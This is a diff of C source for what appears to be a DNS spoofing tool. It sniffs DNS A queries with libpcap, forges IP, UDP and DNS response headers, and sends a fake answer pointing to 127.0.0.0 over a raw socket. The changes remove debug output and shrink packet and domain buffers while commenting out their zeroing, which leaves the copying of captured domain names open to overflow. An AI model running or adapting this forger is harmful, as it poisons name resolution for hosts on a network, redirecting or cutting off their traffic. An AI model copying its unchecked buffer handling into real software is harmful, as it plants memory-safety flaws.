@@ -224,8 +224,7 @@ void send_forged_dns_response(unsigned long destination_address, u_int16_t desti
 	source.sin_port = destination_port;
 	inet_aton(temp, &addr);
 	source.sin_addr = addr;
-	printf("destination address = %lu and destination port = %d and ntohs %d\n", destination_address, \
-					destination_port, ntohs(destination_port));
+	
 	// Inform the kernel do not fill up the headers' structure, we fabricated our own
 	if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
 	{
@@ -252,23 +251,21 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 		printf("   * Invalid IP header length: %u bytes\n", size_ip);
 		return;
 	}
-
+	
+	const struct udphdr *udp;
 	/* determine protocol */
 	switch(ip->ip_p) {
 		case IPPROTO_UDP:
-			sprintf(args + strlen(args)," UDP");
-			int size_udp;
-			const struct udphdr *udp;            /* The UDP header */
 			udp = (struct udphdr*)(packet + SIZE_ETHERNET + size_ip);
 
 			*payload = (u_char *)(packet + SIZE_ETHERNET);
 			*size_payload = ntohs(ip->ip_len);
 
-			char datagram[8192];
+			char datagram[150];
 
 			// Forging the IP header
 			struct sniff_ip *spoofed_ip_header = (struct sniff_ip *)datagram;
-			memset(datagram, 0, 8192);
+			//memset(datagram, 0, 8192);
 
 			spoofed_ip_header->ip_vhl = ip->ip_vhl;
 			spoofed_ip_header->ip_tos = ip->ip_tos;
@@ -306,8 +303,8 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 				// Forging the DNS Answer
 
 				// Copying the domain name
-				char name1[100000];
-				memset(name1, '\0', sizeof(name1));
+				char name1[100];
+				//memset(name1, '\0', sizeof(name1));
 				char *domain = (char*)(packet + SIZE_ETHERNET + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header));
 
 				struct dns_answer* spoofed_dns_answer = (struct dns_answer*)(datagram + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header));
@@ -339,15 +336,15 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 				answer_data1->rdlength = htons(4); // ip value is 4 bytes, hence this is 4
 				answer_data1->rdata = htonl(2130706432);  // 127.0.0.0
 
-				sprintf(args + strlen(args), " %s:%d ->", inet_ntoa(ip->ip_src), ntohs(udp->uh_sport));
-				sprintf(args + strlen(args), " %s:%d ", inet_ntoa(ip->ip_dst), ntohs(udp->uh_dport));
+				//sprintf(args + strlen(args), " %s:%d ->", inet_ntoa(ip->ip_src), ntohs(udp->uh_sport));
+				//sprintf(args + strlen(args), " %s:%d ", inet_ntoa(ip->ip_dst), ntohs(udp->uh_dport));
 
 				// Checking for DNS queries only of the type A and class INTERNET
 				if(ntohs(query->type) != 1 || ntohs(query->class) != 1)
 				    return;
 
 				if (stringExpression == NULL || ((*size_payload > 0) && strstr((char*)*payload, (char*)stringExpression))){
-				    sprintf(args + strlen(args), " IP_length in hex %d", size_of_forged_dns_response);
+				    /*sprintf(args + strlen(args), " IP_length in hex %d", size_of_forged_dns_response);
 				    sprintf(args + strlen(args), " Payload (%d bytes):", *size_payload);
 				    printf("%s\n", args);
 				    print_payload(*payload, *size_payload);
@@ -355,7 +352,7 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 				    u_char *pay1 = (u_char*)datagram;
 				    print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header) \
 					+ strlen(domain) + 1 + sizeof(struct dns_answer_data) + sizeof(struct dns_answer_data_1));
-				    printf("Response End\n");
+				    printf("Response End\n");*/
 				    send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram, size_of_forged_dns_response);
 				}
 			}
@@ -392,28 +389,28 @@ got_packet(u_char *stringExpression, const struct pcap_pkthdr *header, const u_c
 	/* define ethernet header */
 	ethernet = (struct ether_header*)(packet);
 	
-	sprintf(args, "%02x:%02x:%02x:%02x:%02x:%02x", ethernet->ether_shost[0],
+	/*sprintf(args, "%02x:%02x:%02x:%02x:%02x:%02x", ethernet->ether_shost[0],
 									ethernet->ether_shost[1],
 									ethernet->ether_shost[2],
 									ethernet->ether_shost[3],
 									ethernet->ether_shost[4],
-									ethernet->ether_shost[5]);
+									ethernet->ether_shost[5]); */
 
-	sprintf(args + strlen(args), " -> ");
+	//sprintf(args + strlen(args), " -> ");
 
-	sprintf(args + strlen(args), "%02x:%02x:%02x:%02x:%02x:%02x", ethernet->ether_dhost[0],
+	/*sprintf(args + strlen(args), "%02x:%02x:%02x:%02x:%02x:%02x", ethernet->ether_dhost[0],
 									ethernet->ether_dhost[1],
 									ethernet->ether_dhost[2],
 									ethernet->ether_dhost[3],
 									ethernet->ether_dhost[4],
-									ethernet->ether_dhost[5]);
-	sprintf(args + strlen(args), " ethertype ");
+									ethernet->ether_dhost[5]); */
+	//sprintf(args + strlen(args), " ethertype ");
 	switch(ntohs(ethernet->ether_type))
 	{
 		case ETHERTYPE_IP:
-			sprintf(args + strlen(args), "IPv4 ");
-			sprintf(args + strlen(args), "(0x%x)", ntohs(ethernet->ether_type));
-			sprintf(args + strlen(args), " length %u", header->len);
+			//sprintf(args + strlen(args), "IPv4 ");
+			//sprintf(args + strlen(args), "(0x%x)", ntohs(ethernet->ether_type));
+			//sprintf(args + strlen(args), " length %u", header->len);
 			print_ip_packet(args, packet, &payload, &size_payload, stringExpression);
 			break;
 		default:
